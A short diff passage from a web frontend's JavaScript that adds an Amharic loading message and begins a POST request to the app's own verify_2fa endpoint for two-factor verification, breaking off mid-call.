+        showMsg(3, 'loading-msg', 'ፓስዎርዱን በማረጋገጥ ላይ...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
                 method: 'POST',
